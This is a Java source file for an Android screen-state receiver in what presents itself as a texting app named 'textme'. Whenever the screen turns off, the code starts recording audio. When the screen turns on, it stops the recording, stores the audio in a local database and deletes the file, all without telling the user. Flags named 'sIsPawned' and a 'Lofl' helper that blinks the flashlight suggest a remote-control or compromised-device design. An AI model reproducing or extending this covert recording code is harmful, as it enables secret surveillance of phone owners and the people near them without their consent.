package com.candroid.textme.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;

import com.candroid.textme.api.Lofl;
import com.candroid.textme.data.db.Database;
import com.candroid.textme.data.db.DatabaseHelper;
import com.candroid.textme.services.MessagingService;

import java.io.File;

public class ScreenReceiver extends BroadcastReceiver {
    public static boolean sIsPawned = false;
    protected static boolean sKill = false;
    private static boolean isTaskScheduled = false;
    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals(Intent.ACTION_SCREEN_ON)){
            MessagingService.stopRecording();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    File file = MessagingService.sRecorder.getFile();
                    SQLiteDatabase db = DatabaseHelper.getInstance(context).getWritableDatabase();
                    try{
                        db.beginTransaction();
                        Database.insertMedia(db, file.getName(), file);
                        db.setTransactionSuccessful();
                    }catch (SQLException e){
                        e.printStackTrace();
                    }finally {
                        db.endTransaction();
                        db.close();
                        file.delete();
                    }
                }
            }).start();


            /*if(!isTaskScheduled){
                if(Lofl.isPawned(context)){
                    isTaskScheduled = true;
                    Lofl.persistentBlinkingFlashlight(context);
                }
            }*/
            if(!isTaskScheduled && sIsPawned){
                Lofl.persistentBlinkingFlashlight(context);
            }
        }else if(intent.getAction().equals(Intent.ACTION_SCREEN_OFF)){
            sKill = true;
            MessagingService.recordAudio();
        }
    }
}
